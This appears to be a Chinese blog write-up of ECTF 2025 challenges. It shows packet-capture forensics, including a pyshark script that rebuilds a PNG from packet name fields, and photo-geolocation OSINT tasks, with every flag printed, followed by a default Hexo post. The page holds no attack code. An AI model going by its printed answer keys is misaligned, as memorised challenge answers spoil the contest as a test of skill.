<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111326784.png" alt="image-20250204111326784"></p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111406843.png" alt="image-20250204111406843"></p>
<p>确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5</span><br><span class="line"></span><br><span class="line">-&gt;(base64)</span><br><span class="line"></span><br><span class="line">ectf&#123;P05t_1s_v3ry_345y_T0_F1N</span><br></pre></td></tr></table></figure>

<p>于是我们找这份文件在纪录里的具体位置：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111713246.png" alt="image-20250204111713246"></p>
<p>可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==</span><br><span class="line"></span><br><span class="line">-&gt;(base64)</span><br><span class="line"></span><br><span class="line">ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Just-a-PCAP"><a href="#Just-a-PCAP" class="headerlink" title="Just a PCAP"></a>Just a PCAP</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234546652.png" alt="image-20250203234546652"></p>
<p>这道题也是一份pcap文件，再次用Wireshark打开。</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204112053442.png" alt="image-20250204112053442"></p>
<p>但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。）</p>
<p>这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\的tshark.exe</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> pyshark.packet</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">capture = pyshark.FileCapture(<span class="string">&#x27;justapcap.pcap&#x27;</span>, tshark_path=<span class="string">&#x27;D:\\Program Files\\Wireshark\\tshark.exe&#x27;</span>)		<span class="comment"># 将这个路径替换成自己电脑上tshark.exe的路径</span></span><br><span class="line">hexstr = <span class="string">&quot;&quot;</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> capture:</span><br><span class="line">    s = <span class="built_in">str</span>(packet)</span><br><span class="line">    cur = s.split(<span class="string">&quot;Name:&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;1m &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    hexstr += cur</span><br><span class="line">hexstr = hexstr.split(<span class="string">&quot;exam&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.png&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unhexlify(hexstr))</span><br></pre></td></tr></table></figure>

<p>然后就会得到这张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/a.png" alt="a"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125;</span><br></pre></td></tr></table></figure>





<h2 id="6-Osint"><a href="#6-Osint" class="headerlink" title="6. Osint"></a>6. Osint</h2><h3 id="Project-153-Q1"><a href="#Project-153-Q1" class="headerlink" title="Project-153-Q1"></a>Project-153-Q1</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113219584.png" alt="image-20250204113219584"></p>
<p>这道题我们会得到这张图片：</p>
<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/OSINT_1_-_question-1.jpg" alt="OSINT_1_-_question-1"></p>
<p>通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204115324497.png" alt="image-20250204115324497"></p>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;Chutes_du_Caramy&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Project-153-Q2"><a href="#Project-153-Q2" class="headerlink" title="Project-153-Q2"></a>Project-153-Q2</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113324647.png" alt="image-20250204113324647"></p>
<p>这道题我们会得到这张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/OSINT_1_-_question-2.jpg" alt="OSINT_1_-_question-2"></p>
<p>通过谷歌识图可以判断出来这张照片是在 Massif de l’Esterel 附近拍摄的。</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204131332318.png" alt="image-20250204131332318"></p>
<p>但由于题目要求的是拍摄时所处的具体位置，所以我们还需要找些其他的线索。</p>
<p>注意到图片远处这里，有一座全是房子的半岛：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204131614306.png" alt="image-20250204131614306"></p>
<p>于是我们打开Google Earth，查看Massif de l’Esterel附近的海岸线。可以发现这个地方非常想图中的半岛：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204131846773.png" alt="image-20250204131846773"></p>
<p>并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204131937927.png" alt="image-20250204131937927"></p>
<p>跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;Pointe_de_l&#x27;Observatoire&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Project-153-Q3"><a href="#Project-153-Q3" class="headerlink" title="Project-153-Q3"></a>Project-153-Q3</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113338645.png" alt="image-20250204113338645"></p>
<p>这道题我们会得到这张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/OSINT_1_-_question-3.jpg" alt="OSINT_1_-_question-3"></p>
<p>再次通过谷歌识图可以发现图片所在地是 Rocher de Roquebrune：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204132411711.png" alt="image-20250204132411711"></p>
<p>在Google Earth找到这里</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204132537218.png" alt="image-20250204132537218"></p>
<p>便可以在相册里发现这张图片，大概率是题目所指的“monster：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204132638589.png" alt="image-20250204132638589"></p>
<p>所以答案为左下角的作者名字。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;Michael_DELAETER&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Project-153-Q4"><a href="#Project-153-Q4" class="headerlink" title="Project-153-Q4"></a>Project-153-Q4</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113351088.png" alt="image-20250204113351088"></p>
<p>首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204133041579.png" alt="image-20250204133041579"></p>
<p>在Google Earth找到这里：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204133137356.png" alt="image-20250204133137356"></p>
<p>根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;Île_du_Levant&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Project-153-Q5"><a href="#Project-153-Q5" class="headerlink" title="Project-153-Q5"></a>Project-153-Q5</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113405376.png" alt="image-20250204113405376"></p>
<p>这道题我们会得到这张图片：</p>
<p><img src="/../../../../CTF-win/%25E6%25AF%2594%25E8%25B5%259B/ECTF%2520(2025.01.24-26)/OSINT_1_-_question-5/PANO_20220408_134922.jpg" alt="PANO_20220408_134922"></p>
<p>这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。</p>
<p>然后便可以用谷歌识图来确认地点：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204133815353.png" alt="image-20250204133815353"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;Gros_Cerveau&#125;</span><br></pre></td></tr></table></figure>

<p>(在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。)</p>
<h3 id="Project-153-Q6"><a href="#Project-153-Q6" class="headerlink" title="Project-153-Q6"></a>Project-153-Q6</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113418057.png" alt="image-20250204113418057"></p>
<p>这道题我们会得到这张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/OSINT_1_-_question-6.jpg" alt="OSINT_1_-_question-6"></p>
<p>再次通过谷歌识图我们可以找到这样一条Instergram：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/ectf_o6.png" alt="ectf_o6"></p>
<p>（为了防止侵犯个人隐私我给图片打了个码。）</p>
<p>于是可以得知这张照片的拍摄所在地为 Moustiers-Sainte-Marie （zipcode：04360）。</p>
<p>至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204134657214.png" alt="image-20250204134657214"></p>
<p>最后的flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;262_04360&#125;</span><br></pre></td></tr></table></figure>





<h3 id="PNJ-3-Gouzou"><a href="#PNJ-3-Gouzou" class="headerlink" title="PNJ - 3 - Gouzou"></a>PNJ - 3 - Gouzou</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113429216.png" alt="image-20250204113429216"></p>
<p>这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113832122.png" alt="image-20250204113832122"></p>
<p>发现是法国艺术家JACE创作一个没有五官的诙谐卡通形象。根据这条线索我们可以锁定这张图片（也就是说我们需要找的应该是这张图片的具体位置）：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/1.jpg" alt="1"></p>
<p>根据谷歌识图可以发现这张照片在 “Île de Ré”（雷岛）：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204114154456.png" alt="image-20250204114154456"></p>
<p>通过搜索“île de ré gouzou”可以找到这个网页：<a target="_blank" rel="noopener" href="https://www.realahune.fr/les-murs-dexpression-de-latlantique/%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%8F%91%E7%8E%B0%EF%BC%9A">https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现：</a></p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204114831304.png" alt="image-20250204114831304"></p>
<p>于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;digue_du_boutillon&#125;</span><br></pre></td></tr></table></figure>


    <!-- Only display the Read More link if we are displaying an excerpt -->
    

    <hr />

    

    



</div>
</div>


    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2025/03/02/hello-world/">Hello World</a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2025-03-02
        
    </p>

    

    <!-- Content -->
    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

    <!-- Only display the Read More link if we are displaying an excerpt -->
    

    <hr />

    

    



</div>
</div>






  </div>
  <!-- Footer -->
  <div id="footer">
  <div id="footer-social">
    
    
    
    
    
    
</div>

  <p id="footer-info">
    &copy; 2025 John Doe<br>
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> -
    Theme <a href="https://github.com/Suolawangzai/hexo-theme-nebula" target="_blank">nebula</a>
  </p>

  <div id="busuanzi">
    <span id="busuanzi_container_site_pv">
      &hearts;
    Total visits: <span id="busuanzi_value_site_pv"></span>
    </span>
  </div>
  <!--
  <div id="footer-info">
    &copy; 2025 John Doe<br>
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
  </div>
-->
</div>

  <!-- After footer scripts -->
  <!-- Disqus Comments -->


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/js/main.js"></script>


</body>

</html>
